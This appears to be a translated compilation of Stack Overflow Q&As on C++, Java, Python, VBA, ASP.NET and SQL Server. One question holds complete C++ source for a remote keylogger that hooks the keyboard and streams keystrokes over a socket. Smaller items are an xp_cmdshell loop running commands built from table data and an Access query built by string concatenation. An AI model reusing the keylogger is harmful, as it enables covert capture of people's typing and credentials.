我知道您已经有了答案，但是您是否研究过 Automator？对于诸如此类的大多数标准脚本，如果您对 AppleScript 不太熟悉，则可能不会那么痛苦。它不是很“程序化”，但它很快，你会花更少的时间调试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-26T03:02:09.550

对于正则表达式——如果你在自己的机器上运行脚本，或者可以捆绑分发它，你可以使用 Satimage 的微笑扩展 ( [http://www.satimage.fr/software/en/downloads/index.html](http://www.satimage.fr/software/en/downloads/index.html) )将正则表达式添加到 Applescript。

# c++ - 无法将 (*)[] 转换为 **

> ID：390385
> 
> 赞同：8
> 
> 时间：2008-12-23T23:34:20.543
> 
> 标签：c++

如果我创建一个文件：

测试.cpp：

```
void f(double **a) {

}

int main() {
    double var[4][2];
    f(var);
} 
```

然后运行： g++ test.cpp -o test

我明白了

```
test.cpp: In function `int main()':
test.cpp:8: error: cannot convert `double (*)[2]' to `double**' for argument `1'
 to `void f(double**)' 
```

为什么我不能这样做？

不是 double var[4][2] 和做 double **var 然后分配内存一样吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-12-23T23:46:51.017

[C++ 字符串：[] 与 *](https://stackoverflow.com/questions/308279/c-vs#308724)

查看*Excursion: Multi Dimensional Arrays*，它描述了如何将多维数组作为参数传递给函数。基本上你想把你的代码改成这样：

```
// same as void f(double (*a)[2]) {
void f(double a[][2]) { 

}

int main() {
    // note. this is not a pointer to a pointer, 
    // but an array of arrays (4 arrays of type double[2])
    double var[4][2];

    // trying to pass it by value will pass a pointer to its
    // first element 
    f(var);
} 
```

被调用函数必须知道除了最后一个维度之外的所有维度。否则索引数组，编译器将无法计算到数组中值的正确距离（a[1] 是`sizeof(double[2])`距 a[0] 的字节）。

您似乎希望能够在不知道维度大小的情况下接受数组。您可以为此使用模板：

```
template<std::size_t N>
void f(double a[][N]) { 
    // N == 2 for us
}

int main() {
    double var[4][2];
    f(var);
} 
```

编译器将为函数使用的每个 N 值复制（实例化）该模板，自动推导正确的 N。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2008-12-24T01:41:12.470

问题是 double** 是指向指针的指针。您的“f”函数希望将指针的地址传递给双精度。如果你调用 f(var)，那么你认为指针到底在哪里？它不存在。

这将起作用：

```
double *tmp = (double *) var;
f (&tmp); 
```

此外，它可以改变 f 的定义：

```
void f (double a[4][2]) { } 
```

现在 f 需要一个指向您拥有的数组类型的指针。那可行。

# destructor - 为什么这行代码会出现缓冲区溢出错误？

> ID：390389
> 
> 赞同：5
> 
> 时间：2008-12-23T23:35:11.087
> 
> 标签：destructor, pcre, buffer-overrun

我只有 1 行代码，这是：

```
pcrecpp::RE re("abc"); 
```

在一个函数里面`OnBnClickedButtonGo()`。此功能在发布模式下失败，但在调试模式下工作正常。

（我在 Windows XP 上使用 Visual Studio 8。）

错误信息是：

```
A buffer overrun has occurred in testregex.exe which has corrupted the program's
internal state. Press Break to debug the program or Continue to terminate
the program.
For more details please see Help topic 'How to debug Buffer Overrun Issues'. 
```

我怀疑它是它的析构函数，它是不可见的和隐含的......但我真的不知道。

PS：我静态链接到 PCRE lib 7.8 版。PS2：不是很相关，但可能会帮助一些无法链接到 PCRE 库的人（我花了几个小时才整理出来）：包括`#define PCRE_STATIC`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2010-01-27T13:01:40.937

在我的情况下，我有同样的错误信息。在调试中一切都很好，但在发布时我收到错误消息。我有一个本地 C/C++ 库，例如`native.dll`. 我创建了一个混合的非托管/托管 C++ 库，它是该库到 .net 的包装器。在某处，`mixed.dll`我有一个非托管函数签名声明，例如：

```
typedef void ( *FunctionOnStartSend)(); 
```

为此，我收到了消息，但是如果我在此处添加“魔术词”，则不会出现错误消息：

```
typedef void (__stdcall *FunctionOnStartSend)(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T00:24:24.747

如果它仅在发布模式下发生，则有可能某些东西正在“优化”出来。尝试做一些不只是一个衬里的事情，比如 Match() ，甚至可以打印出匹配项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-10-07T10:33:01.950

这是我的新历史：大约一个月前，我遇到了一个奇怪的 VS2008 链接故障，那天我发现设置**_SECURE_SCL=0**可能会有所帮助（请参阅[链接文本](http://msdn.microsoft.com/en-us/library/aa985965%28v=VS.80%29.aspx "检查迭代器")）。它有帮助。那天它帮助了我，我只是将这个设置传播到我们在团队中构建的所有库——那是因为 MS 说用不同的 _SECURE_SCL 构建的两个库是不兼容的。

时间过去了，三天前，当 VS2008 显示我们在第一篇文章中看到的错误消息时，我遇到了一个错误。并且调试器没有帮助，因为它仅在发布版本中溢出。我已经花了将近 2 天的时间来泵入库的代码，并且从一行到另一行的溢出都是有缺陷的。最后我开始逐行检查构建设置并计算出这个设置的差异！

为什么，哦，为什么微软的家伙不能在动态加载器代码中嵌入一些小检查来测试当前运行的库和将要动态加载的库是否不**兼容**？！一些节省人们时间的代码。呸！

# serialization - 您为确保应用程序未来版本的数据兼容性做了哪些前期工程？

> ID：390391
> 
> 赞同：1
> 
> 时间：2008-12-23T23:36:48.960
> 
> 标签：serialization, forward-compatibility

我正在对一个项目进行一些重要的重构和功能添加，并且刚刚破坏了与我的数据的向后兼容性。我通过从我用来存放数据的类中创建一堆子类来做到这一点，并且加载旧的序列化对象不再起作用..

您采用了什么样的预先设计或策略来避免这些类型的情况？我应该完全忘记序列化吗？它似乎特别容易出现这类问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T23:48:25.537

我使用 XML。XML 鲜为人知的方面之一是它可以在不破坏向后兼容性的情况下进行扩展。

换句话说...

```
<root>
  <something one="1" two="2"/>
</root> 
```

...从版本 A 开始，向后兼容...没有问题

```
<root>
  <something one="1" two="2" three="3"/>
  <somethingElse five="5"/>
</root> 
```

...来自修订版 B。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T00:03:27.957

除了通常使用至少在某种程度上容忍变化的序列化机制之外，正如 dacracot 所描述的，我尝试对其进行设置，以便我可以对反序列化过程进行一些每个类的调整。有旧数据格式的转换代码很丑陋，但不像丢失您已序列化的所有内容那么丑陋。

# java - Java：向程序添加用户界面

> ID：390394
> 
> 赞同：0
> 
> 时间：2008-12-23T23:37:23.327
> 
> 标签：java, user-interface

如果我有 Java 程序并且需要将其更改为界面并包含图标，是否有任何简单的方法可以做到这一点，是否有一个好的应用程序可以帮助我做到这一点？还是我必须自己编写代码？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-23T23:41:37.593

不，/我认为你需要 1337 mad Java programin' Skillz！

世界其他地方的翻译：对不起，你需要用 Java 编程。

**补充：**嘿，反对票是怎么回事？他开始了！:P 此外，无论他想添加或修改（原文对此并不清楚）Java 程序的 UI，他都需要用 Java 编程**以**将他的 UI 与代码结合在一起。没有神奇的工具可以让你绘制 UI，它会突然做你所做的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T23:41:25.940

[Netbeans](http://www.netbeans.org/)有一个[Swing GUI 生成器](http://www.netbeans.org/features/java/swing.html)。引用他们的网站。希望这不算隐藏广告:)

> 通过将 GUI 组件从调色板拖放到画布上来设计 Swing GUI。GUI builder 会自动处理正确的间距和对齐方式。单击 JLabels、JButtons、ButtonGroups、JTrees、JTextFields、ComboBoxes 并直接就地编辑它们的属性。您可以使用 GUI 构建器在客户面前制作 GUI 原型。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T23:43:39.277

如果您想为您的 Java 程序添加 UI，有一些工具可以帮助您，例如IntelliJ Idea中的[Swing GUI Builder 。](http://www.jetbrains.com/idea/features/gui_builder.html)但是，您仍然需要编写适当的代码来连接到 UI。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T23:42:49.777

只是一个网站？好吧，取决于它是否使用 CSS，您*也许*可以只修改 .css 文件。这只会让您修改网站的*外观*而不是*工作方式*。

有关该技术如何工作的示例，请参见[此处。](http://www.csszengarden.com/)但是，这取决于网站对 css 的依赖程度，您可能仍会遇到一些困难。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-22T09:02:33.937

您想使用 Java 框架来帮助您处理 UI。例如，您可以使用 JSF（Javaserver faces），它允许您将 UI 组件拖放到站点上。否则，您可以使用 Dreamweaver 等 Web 程序来设计 UI，然后再用 Java 自己编写后端逻辑。

# c++ - winsock 缺少数据 c++ win32

> ID：390400
> 
> 赞同：1
> 
> 时间：2008-12-23T23:40:20.327
> 
> 标签：c++, winapi, winsock, data-loss

我正在编写一个需要通过网络发送数据的应用程序。我已完成申请，但发送数据时出现问题。每次发送一条数据，4个字符后就被截断，剩下的就是垃圾。该应用程序是我为一个学校项目编写的远程键盘记录器，它要求您演示钩子和winsock 的用法。我们可以在论坛上寻求帮助。任何帮助，将不胜感激！

这里的代码：

**服务器：**

```
 // rkl.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "rkl.h"
#include <windows.h>
#include <stdio.h>

SOCKET kSock;
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{

WSAData wsdata; 
WORD wsver=MAKEWORD(2, 0); 
int nret=WSAStartup(wsver, &wsdata); 

if(nret != 0)
{
    MessageBoxA(0,"Error 0","Error",MB_OK);
WSACleanup(); 
return -1;
}

kSock=socket(AF_INET, SOCK_STREAM, 0);

if(kSock == INVALID_SOCKET)
{
MessageBoxA(0,"Error 1","Error",MB_OK);
return -1;
}

sockaddr_in sin;
sin.sin_port=htons(808);
sin.sin_addr.s_addr=inet_addr("127.0.0.1");
sin.sin_family=AF_INET;

if(connect(kSock,(sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
{ 
MessageBoxA(0,"Error 2","Error",MB_OK);
WSACleanup(); 
return -1;
}

HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

char buf1[256];
char* buf = buf1;
buf = "Test";
send(kSock,buf,sizeof(buf),0);

MessageBoxA(0,"Press ok to stop logging.","Waiting...",MB_OK);

closesocket(kSock);
return 0;

}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);

    if (wParam == WM_KEYDOWN) {
        char* buf;
char tl[256];
buf = tl;
buf = itoa(p->vkCode,buf,10);
int tmp;

tmp = atoi(buf);

if(tmp != 0)
{
        switch (tmp) {

case VK_BACK:      buf =  "<BACKSPACE>";       break;
case VK_TAB:      buf =  "<TAB>";       break;
case VK_CLEAR:      buf =  "<CLEAR>";       break;
case VK_RETURN:      buf =  "<ENTER>";       break;
case VK_SHIFT:      buf =  "<SHIFT>";       break;
case VK_CONTROL:      buf =  "<CTRL>";       break;
case VK_MENU:      buf =  "<ALT>";       break;
case VK_PAUSE:      buf =  "<PAUSE>";       break;
case VK_CAPITAL:      buf =  "<CAPS LOCK>";       break;
case VK_ESCAPE:      buf =  "<ESC>";       break;
case VK_SPACE:      buf =  "<SPACEBAR>";       break;
case VK_PRIOR:      buf =  "<PAGE UP>";       break;
case VK_NEXT:      buf =  "<PAGE DOWN>";       break;
case VK_END:      buf =  "<END>";       break;
case VK_HOME:      buf =  "<HOME>";       break;
case VK_LEFT:      buf =  "<LEFT ARROW>";       break;
case VK_UP:      buf =  "<UP ARROW>";       break;
case VK_RIGHT:      buf =  "<RIGHT ARROW>";       break;
case VK_DOWN:      buf =  "<DOWN ARROW>";       break;
case VK_SELECT:      buf =  "<SELECT>";       break;
case VK_PRINT:      buf =  "<PRINT>";       break;
case VK_EXECUTE:      buf =  "<EXECUTE>";       break;
case VK_SNAPSHOT:      buf =  "<PRINT SCREEN>";       break;
case VK_INSERT:      buf =  "<INSERT>";       break;
case VK_DELETE:      buf =  "<DEL>";       break;
case VK_HELP:      buf =  "<HELP>";       break;
case VK_LWIN:      buf =  "<Left Windows key>";       break;
case VK_RWIN :      buf =  "<Right Windows key>";       break;
case VK_APPS:      buf =  "<Applications key>";       break;
case VK_SLEEP:      buf =  "<Computer Sleep key>";       break;
case VK_NUMPAD0:      buf =  "0";       break;
case VK_NUMPAD1:      buf =  "1";       break;
case VK_NUMPAD2:      buf =  "2";       break;
case VK_NUMPAD3:      buf =  "3";       break;
case VK_NUMPAD4:      buf =  "4";       break;
case VK_NUMPAD5:      buf =  "5";       break;
case VK_NUMPAD6:      buf =  "6";       break;
case VK_NUMPAD7:      buf =  "7";       break;
case VK_NUMPAD8:      buf =  "8";       break;
case VK_NUMPAD9:      buf =  "9";       break;
case VK_MULTIPLY:      buf =  "*";       break;
case VK_ADD:      buf =  "+";       break;
case VK_SEPARATOR:      buf =  "<Separator key>";       break;
case VK_SUBTRACT:      buf =  "-";       break;
case VK_DECIMAL:      buf =  ".";       break;
case VK_DIVIDE:      buf =  "/";       break;
case VK_F1:      buf =  "<F1>";       break;
case VK_F2:      buf =  "<F2>";       break;
case VK_F3:      buf =  "<F3>";       break;
case VK_F4:      buf =  "<F4>";       break;
case VK_F5:      buf =  "<F5>";       break;
case VK_F6:      buf =  "<F6>";       break;
case VK_F7:      buf =  "<F7>";       break;
case VK_F8:      buf =  "<F8>";       break;
case VK_F9:      buf =  "<F9>";       break;
case VK_F10:      buf =  "<F10>";       break;
case VK_F11:      buf =  "<F11>";       break;
case VK_F12:      buf =  "<F12>";       break;
case VK_NUMLOCK:      buf =  "<NUM LOCK>";       break;
case VK_SCROLL:      buf =  "<SCROLL LOCK>";       break;
case VK_LSHIFT:      buf =  "<Left SHIFT>";       break;
case VK_RSHIFT:      buf =  "<Right SHIFT>";       break;
case VK_LCONTROL:      buf =  "<Left CONTROL>";       break;
case VK_RCONTROL:      buf =  "<Right CONTROL>";       break;
case VK_LMENU:      buf =  "<Left MENU>";       break;
case VK_RMENU:      buf =  "<Right MENU>";       break;
case VK_BROWSER_BACK:      buf =  "<Browser Back key>";       break;
case VK_BROWSER_FORWARD:      buf =  "<Browser Forward key>";       break;
case VK_BROWSER_REFRESH:      buf =  "<Browser Refresh key>";       break;
case VK_BROWSER_STOP:      buf =  "<Browser Stop key>";       break;
case VK_BROWSER_SEARCH:      buf =  "<Browser Search key >";       break;
case VK_BROWSER_FAVORITES:      buf =  "<Browser Favorites key>";       break;
case VK_BROWSER_HOME:      buf =  "<Browser Start and Home key>";       break;
case VK_VOLUME_MUTE:      buf =  "<Volume Mute key>";       break;
case VK_VOLUME_DOWN:      buf =  "<Volume Down key>";       break;
case VK_VOLUME_UP:      buf =  "<Volume Up key>";       break;
case VK_MEDIA_NEXT_TRACK:      buf =  "<Next Track key>";       break;
case VK_MEDIA_PREV_TRACK:      buf =  "<Previous Track key>";       break;
case VK_MEDIA_STOP:      buf =  "<Stop Media key>";       break;
case VK_MEDIA_PLAY_PAUSE:      buf =  "<Play/Pause Media key>";       break;
case VK_LAUNCH_MAIL:      buf =  "<Start Mail key>";       break;
case VK_LAUNCH_MEDIA_SELECT:      buf =  "<Select Media key>";       break;
case VK_LAUNCH_APP1:      buf =  "<Start Application 1 key>";       break;
case VK_LAUNCH_APP2:      buf =  "<Start Application 2 key>";       break;
case VK_OEM_1:      buf =  "<;:' key >";       break;
case VK_OEM_PLUS:      buf =  "+";       break;
case VK_OEM_COMMA:      buf =  ",";       break;
case VK_OEM_MINUS:      buf =  "-";       break;
case VK_OEM_PERIOD:      buf =  ".";       break;
case VK_OEM_2:      buf =  "</?' key >";       break;
case VK_OEM_3:      buf =  "<`~' key >";       break;
case VK_OEM_4:      buf =  "<[{' key>";       break;
case VK_OEM_5:      buf =  "<\|' key>";       break;
case VK_OEM_6:      buf =  "<]}' key>";       break;
case VK_OEM_7:      buf =  "<single-quote/double-quote' key>";       break;
case VK_OEM_CLEAR:      buf =  "<Clear>";       break;

            default:
            buf[0] = char(tmp);
            buf[1] = char(0);
            buf[2] = char(0);
            buf[3] = char(0);
            buf[4] = char(0);
            buf[5] = char(0);
            buf[6] = char(0);
            buf[7] = char(0);
            buf[8] = char(0);

        }

send(kSock,buf,sizeof(buf),0);
}

    return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
} 
```

**客户：**

```
// lkv.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <windows.h> 
#include <iostream>

int main()
{

WSAData wsdata;
WORD wsver=MAKEWORD(2, 0); 
int nret=WSAStartup(wsver, &wsdata); 
if(nret != 0){ 
std::cout<<"Startup failed, error code: "<<WSAGetLastError(); 
WSACleanup(); 
return -1;
}
std::cout<<"Init success\n";
SOCKET kSock=socket(AF_INET, SOCK_STREAM, 0);
if(kSock == INVALID_SOCKET){
std::cout<<"Socket init failed";
return -1;
}
std::cout<<"Socket initialized\n";
sockaddr_in sin;
sin.sin_port=htons(808);
sin.sin_addr.s_addr=INADDR_ANY;
sin.sin_family=AF_INET;
if(bind(kSock,(sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR){
std::cout<<"Failed to bind\n";
WSACleanup(); 
return -1;
}
std::cout<<"Bind successful!\n";
while (listen(kSock, SOMAXCONN) == SOCKET_ERROR); 
SOCKET client;
int len = sizeof(sin);
client=accept(kSock, (sockaddr*)&sin, &len);
std::cout<<"Connection established!\n";
int i;

for(;;)
{
char buf[22];
recv(client, buf, sizeof(buf), 0); 
std::cout << buf;
}

closesocket(client); 
closesocket(kSock);
WSACleanup();
return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-23T23:45:11.143

在您的服务器端，您的发送线路是：

```
send(kSock,buf,sizeof(buf),0); 
```

buf 是一个字符*。在您的情况下 char* 的大小为 4 个字节，因此当您真的要发送缓冲区的大小为 strlen(buf)+1 时，您告诉 send 发送 4 个字节的数据（加一是包括字符串的终止零）。

# asp.net - 使用 ServerXMLHTTP 超时发布 xml

> ID：390402
> 
> 赞同：1
> 
> 时间：2008-12-23T23:40:39.623
> 
> 标签：asp.net, msxml, speechsynthesizer

我在两个网站上工作。一个是现有的经典 asp 站点，它将 xml 发布到新的 asp.net (.net 3.5) 网站。经典的 asp 站点在 vbscript 中使用 msxml 的 serverxmlhttp 对象来发送这个 xml。在我对 asp.net 站点进行看似无关的更改之前，整个过程都有效。

当我添加几行使用 System.Speech.Synthesis 从文本生成 wav 文件的代码时，经典的 asp 网站 serverxmlhttp.send 命令超时。据我所知，asp.net 页面工作正常，它通过几行新代码没有问题（生成 wav 文件）。导致问题的几行语音代码在超时之前就完成了。

看起来 asp.net 页面实际上正在向不再发送的经典页面发送某种确认。我还应该指出，语音代码抛出了一个异常，说它需要是异步的，我通过将 Async="true" 添加到 . 但是，它在 async="true" 时有效，只是那些语音线破坏了它。“问题代码”只是

```
SpeechSynthesizer speaker = new SpeechSynthesizer();
speaker.Volume = 100;
speaker.SelectVoiceByHints(System.Speech.Synthesis.VoiceGender.Female, System.Speech.Synthesis.VoiceAge.Adult, 0);

try
{
    speaker.SetOutputToWaveFile("c:\\test\\output.wav");
}
catch (Exception ex)
{
    retVal = false;
}

speaker.Speak(msgText);
speaker.SetOutputToDefaultAudioDevice(); 
```

有没有人对可能出现的问题或我可以用来帮助调试的内容有任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-05T06:16:01.600

> > 似乎 asp.net 页面实际上正在向不再发送的经典页面发送某种确认

听起来您应该对其进行更多调查，以便您可以告诉我们服务器之前和之后的响应行为。还请指出抛出的异常。

我的猜测是这些 API 在服务过程中不能很好地工作。我真的不知道。我很好奇这个例外，你不清楚你做了什么异步。

# python - 您如何调试 Mako 模板？

> ID：390409
> 
> 赞同：41
> 
> 时间：2008-12-23T23:43:30.430
> 
> 标签：python, debugging, templates, jinja2, mako

到目前为止，我发现当 Mako 模板编码不正确时，不可能产生可用的回溯。

除了对每一行代码进行迭代之外，还有什么方法可以调试模板？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2009-02-11T09:31:33.217

Mako 实际上提供了一种[非常好的方法来跟踪模板中的错误](http://docs.makotemplates.org/en/latest/usage.html#handling-exceptions)：

```
from mako import exceptions

try:
    template = lookup.get_template(uri)
    print template.render()
except:
    print exceptions.html_error_template().render() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-02-22T06:18:39.790

查看[Flask-Mako](http://pythonhosted.org/Flask-Mako/)源代码，我发现了一个未记录的配置参数，名为`MAKO_TRANSLATE_EXCEPTIONS`.

`False`在你的 Flask 应用程序配置中设置它，你会从模板中得到很好的异常。这完成了与@Mariano 建议的相同的事情，而无需编辑源代码。显然，这个参数是在马里亚诺的回答之后添加的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T01:49:17.417

我将它们分解成碎片，然后在发现问题后重新组装。

不好，但是很难判断一个大而复杂的模板出了什么问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-09-29T20:15:14.993

我对 Mako 的主要不满是很难看到模板中发生了什么。由于模板代码是内存中的可运行对象，因此没有调试器可以查看它。

一种解决方案是将模板代码写入文件，并使用此文件作为标准 python 模块重新运行模板。然后你可以调试到你的心内容。

一个例子：

```
import sys
from mako import exceptions, template 
from mako.template import DefTemplate
from mako.runtime import _render

<Do Great Stuff>

try:
    template.render(**arguments))
except:
    # Try to re-create the error using a proper file template
    # This will give a clearer error message.
    with open('failed_template.py', 'w') as out:
        out.write(template._code)
    import failed_template
    data = dict(callable=failed_template.render_body, **arguments)
    try:
        _render(DefTemplate(template, failed_template.render_body),
                failed_template.render_body,
                [],
                data)
    except:
        msg = '<An error occurred when rendering template for %s>\n'%arguments
        msg += exceptions.text_error_template().render()
        print(msg, file=sys.stderr)
        raise 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T22:07:43.000

使用 flask_mako，我发现跳过 TemplateError 生成并传递异常更容易。即在flask_mako.py 中，注释掉导致TemplateError 的部分，然后加注：

```
def _render(template, context, app):
 """Renders the template and fires the signal"""
app.update_template_context(context)
try:
    rv = template.render(**context)
    template_rendered.send(app, template=template, context=context)
    return rv
except:
    #translated = TemplateError(template)                                                                                                                 
    #raise translated                                                                                                                                     
    raise 
```

}

然后你会看到一个导致问题的常规 python 异常以及模板中的行号。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-09-20T03:02:38.233

将两个最佳答案与我自己的特殊酱汁相结合：

```
from flask.ext.mako import render_template as render_template_1
from mako import exceptions

app.config['MAKO_TRANSLATE_EXCEPTIONS'] = False    # seems to be necessary

def render_template(*args, **kwargs):
    kwargs2 = dict(**kwargs)
    kwargs2['config'] = app.config     # this is irrelevant, but useful
    try:
        return render_template_1(*args, **kwargs2)
    except:
        if app.config.get('DEBUG'):
            return exceptions.html_error_template().render()
        raise 
```

它包装了股票“render_template”函数：

*   捕获异常，并且
    *   如果调试，则呈现回溯
    *   如果不调试，请再次引发异常，以便将其记录下来
*   使配置可从页面访问（不相关）

# code-contracts - 基于契约的编程

> ID：390411
> 
> 赞同：4
> 
> 时间：2008-12-23T23:44:13.580
> 
> 标签：code-contracts, spec#

有人可以解释一下 Spec# 可能会转移到 C# 4.0 中的关于代码合同的概念吗？

*   什么是代码合同（看起来是编译时检查模式）
*   我应该为此感到兴奋吗？
*   假设我们将运行时检查转移到编译时，我是否正确？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T01:57:23.607

我个人是一个叫 Bertrand Meyer 的人的忠实粉丝，他写了这本书叫[面向对象的软件构造](https://rads.stackoverflow.com/amzn/click/com/0136291554)，并创建了一种名为 Eiffel 的语言，它支持按合同设计或基于合同的编程。

1.  代码合同是 2 个软件实体之间可能会或可能不会交互的一种协议。或多或少像接口，但更精确。
2.  我不确定每个人是否应该或会对此感到兴奋。
3.  你的假设有些正确。

你可能想看这个系列的视频[链接](http://www.eiffel.com/developers/presentations/dbc/partone/player.html?slide=)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T23:58:43.333

[这是直接来自Microsoft Research](http://research.microsoft.com/en-us/projects/contracts/)的代码合同的很好描述。听起来主要的好处是：

*   提高可测试性
*   静态验证
*   API 文档（在代码中）

# vba - 动态创建查询

> ID：390420
> 
> 赞同：18
> 
> 时间：2008-12-23T23:47:32.200
> 
> 标签：vba, ms-access

嗨，我需要通过代码（又名 VB）在 MSAccess 2003 中创建一个查询——我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-12-23T23:56:58.717

模糊问题的模糊答案:)

```
strSQL="SELECT * FROM tblT WHERE ID =" & Forms!Form1!txtID 

Set qdf=CurrentDB.CreateQueryDef("NewQuery",strSQL)
DoCmd.OpenQuery qdf.Name 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-01-23T10:48:46.063

感谢您的回答和一小段代码。如果有人需要为使用的变量定义数据类型，请使用：

```
 Dim strsql As Variant
    Dim qdf As QueryDef 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-07-11T12:23:40.947

```
Dim strSql As String 'as already in example
Dim qdf As QueryDef 'as already in example

strSql = "SELECT * FROM tblT WHERE ID =" & Forms!Form1!txtID 'as already in example

On Error Resume Next
'Delete the query if it already exists
DoCmd.DeleteObject acQuery, "NewQuery"

Set qdf = CurrentDb.CreateQueryDef("NewQuery", strSql) 'as already in example
DoCmd.OpenQuery qdf.Name 'as already in example

'release memory
qdf.Close 'i changed qdef to qdf here and below
Set qdf = Nothing 
```

# asp.net - xml工具测试xml数据

> ID：390428
> 
> 赞同：1
> 
> 时间：2008-12-23T23:51:11.007
> 
> 标签：asp.net, xml, web-services, soap

我在一个从 Web 服务加载大量 XML 的项目中，我需要发送正确的一个并获得我期望的那个，该部分在调试模式下运行 Web 应用程序并在获取 XML 字符串后添加一个断点，我可以有什么作为免费插件甚至是试用程序来让我查看我的 Web 应用程序发送的 XML 以及它接收的 XML？

希望我说得通。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T00:49:18.330

我不确定您使用的是什么协议，但[Wireshark](http://www.wireshark.org/)应该免费向您展示 :-)

> Wireshark 最强大的功能是其大量的显示过滤器（截至 1.0.5 版本已超过 80000 个）。它们让您可以深入了解您想要查看的确切流量，并且是 Wireshark 的许多其他功能（例如着色规则）的基础。

[http://www.wireshark.org/docs/dfref/](http://www.wireshark.org/docs/dfref/)

# sql-server - EXEC master..xp_cmdshell 可以用于一组数据吗？

> ID：390448
> 
> 赞同：2
> 
> 时间：2008-12-24T00:00:22.767
> 
> 标签：sql-server, sql-server-2005, tsql, exec

我有一个 Windows shell 命令我想为表中的每一行运行一次（通过 EXEC master..xp_cmdshell）。我正在使用来自各个领域的信息来构建命令输出。

我对编写 T-SQL 程序（而不是单独的查询）是相对论的新手，并且不能完全理解它的语法，或者它是否可能/推荐。

我尝试创建一个单列表变量，然后用我要运行的命令填充每一行。我对如何迭代这个表变量并实际运行命令感到窒息。谷歌搜索已被证明无济于事。

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-24T00:33:41.017

你总是可以使用游标：

```
USE Northwind

DECLARE @name VARCHAR(32)
DECLARE @command VARCHAR(100)

DECLARE shell_cursor CURSOR FOR 
SELECT LastName FROM Employees

OPEN shell_cursor

FETCH NEXT FROM shell_cursor INTO @name

WHILE @@FETCH_STATUS = 0
BEGIN
    SET @command = 'echo ' + @name
    EXEC master.dbo.xp_cmdshell @command
    FETCH NEXT FROM shell_cursor INTO @name
END

CLOSE shell_cursor
DEALLOCATE shell_cursor

GO 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T00:36:11.667

这是一次性工作吗？如果是这样，你最好从相反的方向来。也就是说，与其编写存储过程来调用 XP_CMDSHELL 来针对表数据运行某些程序，不如考虑编写一个程序直接针对表数据进行操作。如果想到一种脚本产品，那就是 PowerShell。它集成了对 Windows 平台支持的任何数据库的支持，您会在 www.poshcode.org 上找到大量脚本来执行此类操作。

另一方面，如果这是要安排的事情，我想你的想法没有什么大问题，除了 XP_CMDSHELL 现在被 SQL Server 开箱即用地禁用了。重新启用它会将您的服务器打开一个全新的漏洞利用世界，特别是如果该表数据来自网页表单或其他一些有问题的来源。

-Oisin

# java - 确定java内存使用情况

> ID：390449
> 
> 赞同：5
> 
> 时间：2008-12-24T00:01:34.637
> 
> 标签：java, memory

嗯。Java中的内存使用是否有任何入门知识？我原以为 Sun 或 IBM 会有一篇关于这个主题的好文章，但我找不到任何看起来非常可靠的文章。我有兴趣知道两件事：

1.  在运行时，确定我的包中的类在给定时间使用了多少内存
2.  在设计时，估计各种事物的一般内存开销需求，例如：
    *   空对象需要多少内存开销（除了其字段所需的空间）
    *   创建闭包时需要多少内存开销
    *   像 ArrayList 这样的集合需要多少内存开销

我可能创建了数十万个对象，我想成为一个“好邻居”，以免过度浪费 RAM。我的意思是我真的不在乎我使用的内存是否比“最佳情况”（无论是什么）多 10%，但是如果我正在实现一个使用 5 倍内存的东西，如果我做了一个简单的改变，我想使用更少的内存（或者能够为固定的可用内存量创建更多对象）。

